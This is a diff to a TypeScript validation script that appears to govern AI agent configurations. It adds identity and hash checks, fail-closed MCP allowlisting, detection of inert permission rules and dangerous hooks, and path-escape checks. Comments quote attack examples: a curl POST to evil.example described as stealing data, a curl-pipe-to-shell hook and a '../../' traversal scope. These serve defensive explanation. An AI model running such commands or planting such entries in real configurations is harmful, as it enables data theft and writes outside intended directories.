@@ -13,6 +13,8 @@
  *   5. Composition type consistency across scopes (AB-118)
  *   6. Rule override detection — lower scopes shadowing core rules (AB-119)
  *   7. MCP governance — approved/required server validation (AB-143)
+ *   8. Artifact identity — every governed core/ artifact carries an id, and a
+ *      hash that still matches its body (decision-0005)
  *
  * Usage:
  *   npm run validate
@@ -28,14 +30,15 @@ import chalk from "chalk";
 import {
   type AgentBootConfig,
   type PersonaConfig,
-  resolveConfigPath,
-  loadConfig,
+  resolveHubConfigOrExit,
+  loadConfigOrExit,
   stripJsoncComments,
   traitRefsToNames,
   VALID_WEIGHT_NAMES,
 } from "./lib/config.js";
 import {
   parseFrontmatter,
+  frontmatterBlock,
   DEFAULT_SECRET_PATTERNS,
   scanForSecrets,
   resolveCompositionType,
@@ -43,6 +46,11 @@ import {
 } from "./lib/frontmatter.js";
 import { loadExceptionsFile, validateExceptions, HUB_EXCEPTIONS_FILE } from "./lib/exceptions.js";
 import { resolveDomainDirs, hubContentRoots } from "./lib/scope-layout.js";
+import { dangerousHookFindings, unscannableHookEvents } from "./lib/hook-safety.js";
+import { readScopeGlobs } from "./lib/scope-projection.js";
+import { isSafeRelativeSegment } from "./lib/path-containment.js";
+import { readIdentity, isValidId, isGovernedArtifact, contentHash } from "./lib/artifact-identity.js";
+import { inertPermissionRules, permissionRuleLists } from "./lib/permission-rules.js";
 
 // ---------------------------------------------------------------------------
 // Paths
@@ -649,6 +657,159 @@ function walkDir(dir: string, extensions: string[]): string[] {
 }
 
 // ---------------------------------------------------------------------------
+// Check: artifact identity (decision-0005)
+// ---------------------------------------------------------------------------
+
+/**
+ * Every governed artifact under core/ carries a permanent id.
+ *
+ * WHY THIS IS A HARD ERROR AND NOT A WARNING. An identifier's entire value is
+ * that it predates the question being asked of it, and identity cannot be
+ * minted into the past: an artifact stamped today can only ever claim to date
+ * from today, and everything before is forensic reconstruction from git history
+ * and fuzzy content matching. So an artifact that reaches a release unstamped
+ * is not "missing a field" — it is permanently unattributable. A warning gets
+ * scrolled past; that is how nine of eighteen artifacts came to be unstamped
+ * with the module, the ratified shape and the backfill command all in place and
+ * nothing in the build ever asking.
+ *
+ * Duplicates are the same class from the other side: two artifacts sharing an
+ * id silently merge their histories forever, and the merge is undetectable
+ * afterwards because both files look correctly stamped. `identity` already
+ * refuses to MINT a duplicate; nothing checked the corpus at rest, so a
+ * copy-paste of a stamped file defeated that guard entirely.
+ *
+ * WHY A MISSING ID IS AN ERROR HERE AND A WARNING IN AN ADOPTER'S HUB. The
+ * one-way door is *this package's* 1.0 tag: it freezes the lineage of the
+ * artifacts AgentBoot itself ships, and those are the ones that can never be
+ * stamped afterwards. An adopting hub has its own corpus on its own timeline,
+ * and a gate that refuses to validate a gotcha someone wrote sixty seconds ago
+ * is not governance — it is a build break on the authoring path, arriving
+ * before the author has any reason to care about lineage. NF4-8 already pinned
+ * the invariant that `validate` and `build` reach the same verdict on a
+ * hand-authored artifact; erroring here would break it for every adopter, to
+ * enforce a decision this project made about its own release. So: ERROR on the
+ * corpus whose tag is at stake, WARN (which `--strict` escalates) elsewhere.
+ *
+ * Malformed and duplicate ids are errors EVERYWHERE — those are corruption
+ * rather than absence, and a duplicate merges two histories no matter whose
+ * hub it happens in.
+ *
+ * AND THE HASH IS RECOMPUTED, not merely counted. This gate checked that an
+ * artifact HAD an id and never that its `hash:` described the bytes underneath
+ * it, so at the point the check was declared green 8 of 17 stamped artifacts
+ * carried a wrong content hash — seven minted wrong at stamp time by a
+ * reader/writer split, one gone stale under an ordinary body edit with nothing
+ * asking. A field that is present and WRONG is worse than one that is absent:
+ * absence is visible to every consumer, whereas a wrong hash is read as
+ * authoritative, and the argument for stamping identity before 1.0 is precisely
+ * that the tag freezes what the field means. So the hash is verified with the
+ * same `contentHash` the stamp writes — one hashing path, not a second
+ * implementation, because a reader that hashes differently from the writer is
+ * the defect this check exists to catch rather than a way to catch it.
+ *
+ * A MISMATCH IS AN ERROR EVERYWHERE — corruption, like a malformed or duplicate
+ * id, and it can only occur on an artifact somebody deliberately stamped. A
+ * MISSING hash follows the absence rule above (error on the packaged corpus,
+ * warning elsewhere): an artifact stamped by an older AgentBoot predates the
+ * field, and breaking an adopter's build over that would violate the same
+ * NF4-8 invariant the missing-id split protects.
+ */
+export function checkArtifactIdentity(
+  configDir: string,
+  // Is this the packaged corpus — the one whose lineage the release tag
+  // freezes? Defaulted rather than derived inside so both branches are
+  // reachable from a test; a severity switch only one side of which can ever
+  // execute is indistinguishable from no switch at all.
+  isPackagedCorpus: boolean = path.resolve(configDir) === path.resolve(ROOT)
+): CheckResult {
+  const result = check(
+    "Artifact identity — every governed artifact under core/ carries an id and a matching hash"
+  );
+  const coreDir = path.join(configDir, "core");
+
+  if (!fs.existsSync(coreDir)) {
+    // Not a failure — a hub may legitimately carry no core/ of its own. But it
+    // is not a pass either: say so, rather than printing a green tick over a
+    // check that inspected nothing.
+    warn(result, `No core/ directory at ${coreDir} — identity gate inspected 0 artifacts.`);
+    return result;
+  }
+
+  const artifacts = walkDir(coreDir, [".md"]).filter((f) => isGovernedArtifact(f));
+
+  if (artifacts.length === 0) {
+    warn(result, "core/ contains no governed artifacts — identity gate inspected 0 artifacts.");
+    return result;
+  }
+
+  const byId = new Map<string, string>();
+  const unstamped: string[] = [];
+  const unhashed: string[] = [];
+
+  for (const file of artifacts.sort()) {
+    const rel = path.relative(configDir, file);
+    const content = fs.readFileSync(file, "utf-8");
+    const identity = readIdentity(content);
+
+    if (!identity.id) {
+      unstamped.push(rel);
+      continue;
+    }
+    if (!isValidId(identity.id)) {
+      fail(result, `${rel} has a malformed \`id: ${identity.id}\` — expected a 26-char ULID.`);
+      continue;
+    }
+
+    const prior = byId.get(identity.id);
+    if (prior) {
+      fail(
+        result,
+        `${rel} shares \`id: ${identity.id}\` with ${prior} — a duplicate id merges two ` +
+          `artifacts' histories permanently. One of them needs a fresh id.`
+      );
+      continue;
+    }
+    byId.set(identity.id, rel);
+
+    // The integrity half. Counting the field is not checking it.
+    if (!identity.hash) {
+      unhashed.push(rel);
+      continue;
+    }
+    const actual = contentHash(content);
+    if (identity.hash !== actual) {
+      fail(
+        result,
+        `${rel} declares \`hash: ${identity.hash}\` but its body hashes to ${actual} — the ` +
+          `recorded content hash does not describe the bytes it is attached to. Downstream ` +
+          `consumers read that field as authoritative, so a wrong hash is worse than none. ` +
+          `Run \`agentboot identity\` to re-stamp it (the id is preserved).`
+      );
+    }
+  }
+
+  for (const rel of unstamped) {
+    const msg =
+      `${rel} has no \`id:\` — decision-0005 requires a permanent identifier on every ` +
+      `governed artifact, and an id cannot be minted into the past. Run \`agentboot identity\`.`;
+    if (isPackagedCorpus) fail(result, msg);
+    else warn(result, msg);
+  }
+
+  for (const rel of unhashed) {
+    const msg =
+      `${rel} carries an \`id:\` but no \`hash:\` — decision-0005's shape is id + slug + hash, ` +
+      `and without the hash nothing can tell whether this revision is the one that was ` +
+      `stamped. Run \`agentboot identity\`.`;
+    if (isPackagedCorpus) fail(result, msg);
+    else warn(result, msg);
+  }
+
+  return result;
+}
+
+// ---------------------------------------------------------------------------
 // AB-143: Check 7: MCP connection governance
 // ---------------------------------------------------------------------------
 
@@ -670,29 +831,55 @@ function checkMcpGovernance(config: AgentBootConfig): CheckResult {
     }
   }
 
-  // Validate required servers are in approved list
-  if (mcpConfig.required && mcpConfig.approved) {
-    const approvedNames = new Set(mcpConfig.approved.map(s => s.name));
+  // R2-4: validate required servers are in the approved list.
+  //
+  // The guard used to be `if (mcpConfig.required && mcpConfig.approved)`, so the
+  // check could only run when an approved list already existed — i.e. it was
+  // disabled by the absence of the very thing it compares against. `required:
+  // ["vault"]` with NO `approved` list is the worst state (nothing is approved,
+  // so the required server cannot be), and it was the one state that produced no
+  // finding at all, under a green `✓ … required servers validated`.
+  if (mcpConfig.required?.length) {
+    const approvedNames = new Set((mcpConfig.approved ?? []).map(s => s.name));
     for (const required of mcpConfig.required) {
       if (!approvedNames.has(required)) {
         fail(
           result,
-          `MCP required server "${required}" is not in the approved servers list`
+          `MCP required server "${required}" is not in the approved servers list` +
+          (mcpConfig.approved ? "" : " (mcp.approved is not configured at all)")
         );
       }
     }
   }
 
-  // Validate that claude.mcpServers entries match approved list (if enforceApproved)
-  if (mcpConfig.enforceApproved && config.claude?.mcpServers && mcpConfig.approved) {
-    const approvedByName = new Map(mcpConfig.approved.map(s => [s.name, s]));
+  // Validate that claude.mcpServers entries match approved list (if enforceApproved).
+  //
+  // NF3-1: the THIRD instance of R2-4's shape, in the same function, left
+  // unfixed when the two `required` guards above were corrected. The guard was
+  //
+  //     if (mcpConfig.enforceApproved && config.claude?.mcpServers && mcpConfig.approved)
+  //
+  // — gated on `approved` being present. So `enforceApproved: true` with NO
+  // approved list, which is the state in which NOTHING is approved and therefore
+  // EVERY configured server is unapproved, was the one state that produced no
+  // finding, under `✓ MCP governance — approved servers and required servers
+  // validated`. Reproduced against the real CLI: an `exfil` server running
+  // `curl -X POST https://evil.example/steal` passed validate and was written
+  // verbatim into dist/claude/core/.mcp.json.
+  //
+  // FAIL CLOSED on missing data: an absent approved list is an EMPTY approved
+  // list. `enforceApproved` is a narrowing directive; an unreadable/absent
+  // allowlist must narrow to nothing, never widen to everything.
+  if (mcpConfig.enforceApproved && config.claude?.mcpServers) {
+    const approvedByName = new Map((mcpConfig.approved ?? []).map(s => [s.name, s]));
     for (const [serverName, rawEntry] of Object.entries(config.claude.mcpServers)) {
       const approved = approvedByName.get(serverName);
       if (!approved) {
         fail(
           result,
           `MCP server "${serverName}" in claude.mcpServers is not in the approved list. ` +
-          `Add it to mcp.approved or remove enforceApproved.`
+          `Add it to mcp.approved or remove enforceApproved.` +
+          (mcpConfig.approved ? "" : " (mcp.approved is not configured at all, so nothing is approved)")
         );
         continue;
       }
@@ -738,14 +925,23 @@ function checkMcpGovernance(config: AgentBootConfig): CheckResult {
     }
   }
 
-  // Warn about required servers not configured
-  if (mcpConfig.required && config.claude?.mcpServers) {
-    const configured = new Set(Object.keys(config.claude.mcpServers));
+  // R2-4: warn about required servers not configured.
+  //
+  // Same inversion as above, and sharper: the guard was
+  // `if (mcpConfig.required && config.claude?.mcpServers)`, so the check ran only
+  // when SOME servers were already configured. A hub declaring
+  // `mcp.required: ["vault"]` and configuring no mcpServers at all — zero of the
+  // required servers present, the maximum shortfall — fell straight through and
+  // printed `✓ MCP governance — approved servers and required servers validated`.
+  // A check that switches itself off precisely when it would fire is not a check.
+  if (mcpConfig.required?.length) {
+    const configured = new Set(Object.keys(config.claude?.mcpServers ?? {}));
     for (const required of mcpConfig.required) {
       if (!configured.has(required)) {
         warn(
           result,
-          `MCP required server "${required}" is not configured in claude.mcpServers`
+          `MCP required server "${required}" is not configured in claude.mcpServers` +
+          (config.claude?.mcpServers ? "" : " (no claude.mcpServers are configured at all)")
         );
       }
     }
@@ -820,6 +1016,140 @@ function checkClaudeSettingsPassthrough(config: AgentBootConfig): CheckResult {
 }
 
 // ---------------------------------------------------------------------------
+// G1a / AB-DEF-10: semantically inert permission rule verbs
+// ---------------------------------------------------------------------------
+
+/**
+ * `claude.permissions` is a pass-through, so a rule Claude Code's file
+ * permission check never consults compiled clean, passed `validate --strict`,
+ * was signed into the manifest, and shipped. The verb table and the ground
+ * truth it was read out of live in lib/permission-rules.ts.
+ *
+ * Severity follows configuration.md's stated rule — assigned by what the
+ * operator LOSES, not by importance:
+ *
+ *   deny  → ERROR. The operator believes a control is active and it is not.
+ *           An inert `deny: ["Write(**\/.env)"]` reads as `.env` protection and
+ *           blocks nothing.
+ *   allow → WARN (which --strict escalates). An inert allow costs a
+ *           pre-approval; the operator gets prompted where they expected not to
+ *           be. Nothing is falsely believed enforced, and failing a build over
+ *           lost friction-reduction is the over-gating that gets gates
+ *           switched off.
+ */
+function checkPermissionRuleVerbs(config: AgentBootConfig): CheckResult {
+  const result = check(
+    "Permission rule verbs — no path-scoped rule the platform never consults (an inert control)",
+  );
+  for (const { where, kind, rules } of permissionRuleLists(config)) {
+    for (const finding of inertPermissionRules(rules, where)) {
+      if (kind === "deny") {
+        fail(
+          result,
+          `${finding.message} This is a DENY rule: the policy reads as a control and is not one.`,
+        );
+      } else {
+        warn(result, finding.message);
+      }
+    }
+  }
+  return result;
+}
+
+// ---------------------------------------------------------------------------
+// I2 / D.1: dangerous org-authored hook commands
+// ---------------------------------------------------------------------------
+
+/**
+ * The patterns live in scripts/lib/hook-safety.ts, NOT here, because `build` and
+ * `sync` never call validate — a hub author's `curl … | sh` reached the spoke's
+ * non-overridable managed-settings channel with both commands exiting 0. The
+ * compiler enforces the same list at the same severity; this is the report.
+ */
+function checkDangerousHooks(config: AgentBootConfig, configDir: string): CheckResult {
+  // NF3-2: the check NAME used to be "claude.hooks — …", and so did its input.
+  // Persona-level `hooks` in persona.config.json are the second author-controlled
+  // hook surface: compile.ts merges them into dist/claude/core/settings.json and
+  // sync ships that to every spoke. The green tick therefore asserted a clean
+  // sheet over a surface it had never read. Both surfaces, one check, one name
+  // that says what was actually scanned.
+  const result = check("hook commands — no dangerous shell patterns in org- or persona-authored hooks");
+
+  const sources: Array<{ label: string; hooks: unknown }> = [
+    { label: "claude.hooks", hooks: config.claude?.hooks },
+  ];
+  for (const { name, personaConfig } of enumeratePersonaConfigs(config, configDir)) {
+    if (personaConfig.hooks) {
+      sources.push({ label: `personas/${name} hooks`, hooks: personaConfig.hooks });
+    }
+  }
+
+  for (const source of sources) {
+    // A value the scanner cannot read must not be reported as scanned clean.
+    for (const { event, found } of unscannableHookEvents(source.hooks)) {
+      fail(
+        result,
+        `${source.label}.${event} is ${found}, expected a hook group object or an array of them — ` +
+        `it cannot be scanned and cannot be compiled into a hook that runs`,
+      );
+    }
+    for (const { event, command, why } of dangerousHookFindings(source.hooks)) {
+      // fail(), not warn(). This command runs on every developer machine in
+      // the org, and the operator can always rephrase it or move the logic
+      // into a reviewed script the hook invokes by path.
+      fail(result, `${source.label}.${event}: dangerous command — ${why}\n      ${command}`);
+    }
+  }
+  return result;
+}
+
+/**
+ * Every persona.config.json reachable from this hub, across the same four roots
+ * `checkTraitReferences` walks (package defaults, hub core/, customDir, domain
+ * layers). Shared so a new hook/permission surface cannot be scanned over three
+ * of the four roots by accident.
+ */
+function enumeratePersonaConfigs(
+  config: AgentBootConfig,
+  configDir: string,
+): Array<{ name: string; personaConfig: PersonaConfig }> {
+  const roots: string[] = [
+    path.join(ROOT, "core", "personas"),
+    path.join(configDir, "core", "personas"),
+  ];
+  if (config.personas?.customDir) {
+    const ext = path.resolve(configDir, config.personas.customDir);
+    if (fs.existsSync(ext)) roots.push(ext);
+  }
+  for (const d of resolveDomainDirs(config, configDir)) {
+    if (d.personasDir) roots.push(d.personasDir);
+  }
+
+  // Later roots override earlier ones by name, matching compile.ts's
+  // package → hub → customDir precedence.
+  const byName = new Map<string, PersonaConfig>();
+  for (const root of roots) {
+    if (!fs.existsSync(root)) continue;
+    for (const personaName of fs.readdirSync(root)) {
+      const personaDir = path.join(root, personaName);
+      if (!fs.statSync(personaDir).isDirectory()) continue;
+      const configPath = path.join(personaDir, "persona.config.json");
+      if (!fs.existsSync(configPath)) continue;
+      try {
+        byName.set(
+          personaName,
+          JSON.parse(stripJsoncComments(fs.readFileSync(configPath, "utf-8"))) as PersonaConfig,
+        );
+      } catch {
+        // Malformed JSON is already reported by checkTraitReferences; not
+        // swallowed here, just not double-reported.
+      }
+    }
+  }
+  return [...byName].map(([name, personaConfig]) => ({ name, personaConfig }));
+}
+
+// ---------------------------------------------------------------------------
 // B7: policy exceptions — well-formed, owned, and not expired
 // ---------------------------------------------------------------------------
 
@@ -844,8 +1174,85 @@ function checkPolicyExceptions(configDir: string): CheckResult {
 // Phase 11 C1.4: HARD guardrail override detection
 // ---------------------------------------------------------------------------
 
+/**
+ * NF4-8: `validate` passed artifacts that `build` refuses.
+ *
+ * Two build gates had no pre-flight equivalent, so `agentboot validate` printed
+ * "All 12 checks passed" and exited 0 on a hub that `agentboot build` then
+ * rejected:
+ *
+ *   * an UNREADABLE path scope (NF2-3) — `paths: ["src/a/**"` with no closing
+ *     bracket. An unreadable scope cannot be delivered as "no scope", because
+ *     that delivers a narrow rule as always-on.
+ *   * a path scope whose first segment ESCAPES the output root (60bc867) — the
+ *     Gemini emitter derives a directory name from `paths:`, so
+ *     `paths: "../../../../victim-repo/**"` wrote a GEMINI.md at that resolved
+ *     location. That one is a CRITICAL, caught only at build.
+ *
+ * `build` is the real gate and nothing is written outside dist/ before it
+ * refuses, so this is a pre-flight COMPLETENESS gap rather than a hole. It still
+ * matters: validate is what a hub's CI runs on a PR, and a check that passes
+ * everything the next stage will reject teaches people to skip it.
+ *
+ * Deliberately reads through the same `readScopeGlobs` and
+ * `isSafeRelativeSegment` the build uses. A second parser here would be the
+ * exact drift that produced seven hand-rolled scope readers in the first place.
+ */
+function checkScopeKeys(config: AgentBootConfig, configDir: string): CheckResult {
+  const result = check(
+    "Path scopes are readable and stay inside the output root (the same two gates `build` applies)",
+  );
+
+  const groups: Array<{ dir: string; key: "applyTo" | "paths"; enabled?: string[] | undefined }> = [
+    { dir: path.join(configDir, "core", "instructions"), key: "applyTo", enabled: config.instructions?.enabled },
+    { dir: path.join(configDir, "core", "gotchas"), key: "paths" },
+  ];
+  // Domains are compile inputs too — the gap NEW-1 closed on the build side.
+  for (const domainRef of config.domains ?? []) {
+    const domainPath = typeof domainRef === "string"
+      ? path.resolve(configDir, domainRef)
+      : path.resolve(configDir, domainRef.path ?? `./domains/${domainRef.name}`);
+    groups.push({ dir: path.join(domainPath, "instructions"), key: "applyTo" });
+  }
+
+  for (const { dir, key, enabled } of groups) {
+    if (!fs.existsSync(dir)) continue;
+    for (const file of fs.readdirSync(dir).filter((f) => f.endsWith(".md"))) {
+      const name = path.basename(file, ".md");
+      if (enabled && !enabled.includes(name)) continue;
+      const rel = path.relative(configDir, path.join(dir, file));
+      const content = fs.readFileSync(path.join(dir, file), "utf-8");
+      const { globs, malformed } = readScopeGlobs(content, key);
+      if (malformed) {
+        fail(
+          result,
+          `${rel}: ${key} is unreadable (${malformed}). \`build\` refuses this — an unreadable ` +
+            `scope cannot be delivered as "no scope", which would deliver a narrow rule always-on.`,
+        );
+        continue;
+      }
+      for (const glob of globs) {
+        // The first segment is what the Gemini emitter turns into a directory.
+        // An ABSOLUTE glob splits to a leading EMPTY segment, so a `if (first)`
+        // guard skips exactly the case that most obviously escapes — caught by
+        // the validate-and-build-agree fixture rather than by reading the code.
+        const first = glob.split(/[\\/]+/)[0] ?? "";
+        const escapes = path.isAbsolute(glob) || (first !== "" && first !== "**" && !isSafeRelativeSegment(first));
+        if (escapes) {
+          fail(
+            result,
+            `${rel}: ${key} entry "${glob}" escapes the output root. \`build\` refuses this — ` +
+              `the scope's first segment becomes a directory name under dist/.`,
+          );
+        }
+      }
+    }
+  }
+  return result;
+}
+
 function checkHardGuardrails(_config: AgentBootConfig, configDir: string): CheckResult {
-  const result = check("HARD guardrails — lower scopes cannot override HARD artifacts");
+  const result = check("HARD guardrail override protection — no lower scope shadows or downgrades a HARD artifact (does NOT test whether any target can enforce it — see `doctor`)");
 
   // Scan instruction and trait files for guardrail: hard frontmatter
   const hardArtifacts = new Map<string, string>(); // name → scope
@@ -855,8 +1262,8 @@ function checkHardGuardrails(_config: AgentBootConfig, configDir: string): Check
   if (fs.existsSync(instructionsDir)) {
     for (const file of fs.readdirSync(instructionsDir).filter(f => f.endsWith(".md"))) {
       const content = fs.readFileSync(path.join(instructionsDir, file), "utf-8");
-      const fm = content.match(/^---\n([\s\S]*?)\n---/);
-      if (fm && /guardrail:\s*hard/i.test(fm[1]!)) {
+      const fm = frontmatterBlock(content);
+      if (fm !== null && /guardrail:\s*hard/i.test(fm)) {
         hardArtifacts.set(path.basename(file, ".md"), "core");
       }
     }
@@ -867,8 +1274,8 @@ function checkHardGuardrails(_config: AgentBootConfig, configDir: string): Check
   if (fs.existsSync(traitsDir)) {
     for (const file of fs.readdirSync(traitsDir).filter(f => f.endsWith(".md"))) {
       const content = fs.readFileSync(path.join(traitsDir, file), "utf-8");
-      const fm = content.match(/^---\n([\s\S]*?)\n---/);
-      if (fm && /guardrail:\s*hard/i.test(fm[1]!)) {
+      const fm = frontmatterBlock(content);
+      if (fm !== null && /guardrail:\s*hard/i.test(fm)) {
         hardArtifacts.set(path.basename(file, ".md"), "core");
       }
     }
@@ -895,8 +1302,8 @@ function checkHardGuardrails(_config: AgentBootConfig, configDir: string): Check
         const artifactName = path.basename(file, ".md");
         if (!hardArtifacts.has(artifactName)) continue;
         const content = fs.readFileSync(path.join(subDir, file), "utf-8");
-        const fm = content.match(/^---\n([\s\S]*?)\n---/);
-        const isHard = fm ? /guardrail:\s*hard/i.test(fm[1]!) : false;
+        const fm = frontmatterBlock(content);
+        const isHard = fm !== null ? /guardrail:\s*hard/i.test(fm) : false;
         if (!isHard) {
           fail(result,
             `${scopeLabel} ${sub}/${file} shadows HARD artifact "${artifactName}" ` +
@@ -986,13 +1393,13 @@ function checkHardGuardrails(_config: AgentBootConfig, configDir: string): Check
 
 async function main(): Promise<void> {
   const argv = process.argv.slice(2);
-  const configPath = resolveConfigPath(argv, ROOT);
+  const configPath = resolveHubConfigOrExit(argv, "validate");
   const forceStrict = argv.includes("--strict");
 
   console.log(chalk.bold("\nAgentBoot — validate"));
   console.log(chalk.gray(`Config: ${configPath}\n`));
 
-  const config = loadConfig(configPath);
+  const config = loadConfigOrExit(configPath, "validate");
   const configDir = path.dirname(configPath);
   const strictMode = forceStrict || (config.validation?.strictMode ?? false);
 
@@ -1011,8 +1418,12 @@ async function main(): Promise<void> {
     checkMcpGovernance(config),
     checkMcpPinning(config),
     checkClaudeSettingsPassthrough(config),
+    checkPermissionRuleVerbs(config),
+    checkDangerousHooks(config, configDir),
     checkPolicyExceptions(configDir),
     checkHardGuardrails(config, configDir),
+    checkScopeKeys(config, configDir),
+    checkArtifactIdentity(configDir),
   ];
 
   // Print results.
